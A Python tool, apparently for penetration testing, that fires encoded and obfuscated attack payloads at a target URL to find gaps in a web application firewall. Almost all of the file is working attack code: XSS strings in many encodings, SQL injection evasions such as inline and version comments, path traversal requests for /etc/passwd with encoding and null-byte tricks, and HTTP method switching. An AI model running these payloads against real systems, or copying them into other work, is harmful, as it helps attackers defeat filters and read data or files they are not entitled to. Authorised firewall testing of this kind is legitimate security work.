#!/usr/bin/env python3
"""Agent for testing WAF bypass techniques.

Sends encoded, obfuscated, and protocol-level bypass payloads
against a target URL to identify WAF evasion weaknesses in
XSS, SQLi, and path traversal filtering.
"""

import requests
import json
import sys
import urllib.parse
from datetime import datetime


class WAFBypassAgent:
    """Tests web application firewall bypass techniques."""

    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.findings = []

    def _send(self, payload, param="q", method="GET", headers=None):
        try:
            if method == "GET":
                resp = self.session.get(
                    self.target_url, params={param: payload},
                    headers=headers or {}, timeout=10, allow_redirects=False)
            else:
                resp = self.session.post(
                    self.target_url, data={param: payload},
                    headers=headers or {}, timeout=10, allow_redirects=False)
            return {"status": resp.status_code, "length": len(resp.text),
                    "blocked": resp.status_code in (403, 406, 429, 501)}
        except requests.RequestException as exc:
            return {"error": str(exc)}

    def test_encoding_bypasses(self, base_payload="<script>alert(1)</script>"):
        """Test URL encoding, double encoding, and Unicode bypasses."""
        encodings = {
            "plain": base_payload,
            "url_encoded": urllib.parse.quote(base_payload),
            "double_encoded": urllib.parse.quote(urllib.parse.quote(base_payload)),
            "hex_entities": "".join(f"&#x{ord(c):02x};" for c in base_payload),
            "unicode_fullwidth": base_payload.replace("<", "\uff1c").replace(">", "\uff1e"),
            "null_byte": base_payload[:7] + "%00" + base_payload[7:],
            "tab_insert": base_payload.replace("script", "scr\tipt"),
            "newline_insert": base_payload.replace("script", "scr\nipt"),
        }
        results = []
        for name, payload in encodings.items():
            resp = self._send(payload)
            bypassed = not resp.get("blocked", True) and not resp.get("error")
            if bypassed:
                self.findings.append({"type": "Encoding Bypass", "technique": name,
                                      "severity": "High"})
            results.append({"technique": name, "blocked": resp.get("blocked"),
                            "status": resp.get("status")})
        return results

    def test_sqli_bypasses(self):
        """Test SQL injection WAF bypass techniques."""
        payloads = {
            "inline_comment": "1'/**/OR/**/1=1--",
            "version_comment": "1'/*!50000OR*/1=1--",
            "case_variation": "1' oR 1=1--",
            "concat_function": "1' OR CONCAT(0x31)=1--",
            "hex_encoding": "1' OR 0x313d31--",
            "scientific_notation": "1' OR 1e0=1e0--",
            "buffer_overflow": "1' OR " + "A" * 5000 + " 1=1--",
            "json_content_type": "1' OR '1'='1",
        }
        results = []
        for name, payload in payloads.items():
            headers = {"Content-Type": "application/json"} if name == "json_content_type" else {}
            resp = self._send(payload, method="POST", headers=headers)
            bypassed = not resp.get("blocked", True) and not resp.get("error")
            if bypassed:
                self.findings.append({"type": "SQLi WAF Bypass", "technique": name,
                                      "severity": "Critical"})
            results.append({"technique": name, "blocked": resp.get("blocked"),
                            "status": resp.get("status")})
        return results

    def test_path_traversal_bypasses(self):
        """Test path traversal WAF evasion."""
        payloads = {
            "dot_dot_slash": "../../../etc/passwd",
            "encoded_dots": "..%2f..%2f..%2fetc%2fpasswd",
            "double_encoded": "..%252f..%252f..%252fetc%252fpasswd",
            "utf8_encoding": "..%c0%af..%c0%afetc/passwd",
            "backslash": "..\\..\\..\\etc\\passwd",
            "null_byte_ext": "../../../etc/passwd%00.png",
        }
        results = []
        for name, payload in payloads.items():
            resp = self._send(payload, param="file")
            bypassed = not resp.get("blocked", True) and not resp.get("error")
            if bypassed:
                self.findings.append({"type": "Path Traversal Bypass",
                                      "technique": name, "severity": "High"})
            results.append({"technique": name, "blocked": resp.get("blocked"),
                            "status": resp.get("status")})
        return results

    def test_http_method_bypass(self):
        """Test if WAF only inspects certain HTTP methods."""
        methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]
        payload = "<script>alert(1)</script>"
        results = []
        for method in methods:
            try:
                resp = self.session.request(method, self.target_url,
                                            params={"q": payload}, timeout=10)
                results.append({"method": method, "status": resp.status_code,
                                "blocked": resp.status_code in (403, 406, 429)})
            except requests.RequestException:
                results.append({"method": method, "error": "failed"})
        return results

    def generate_report(self):
        report = {
            "target": self.target_url,
            "report_date": datetime.utcnow().isoformat(),
            "total_bypasses": len(self.findings),
            "findings": self.findings,
        }
        print(json.dumps(report, indent=2))
        return report


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080/"
    agent = WAFBypassAgent(url)
    agent.test_encoding_bypasses()
    agent.test_sqli_bypasses()
    agent.test_path_traversal_bypasses()
    agent.test_http_method_bypass()
    agent.generate_report()


if __name__ == "__main__":
    main()
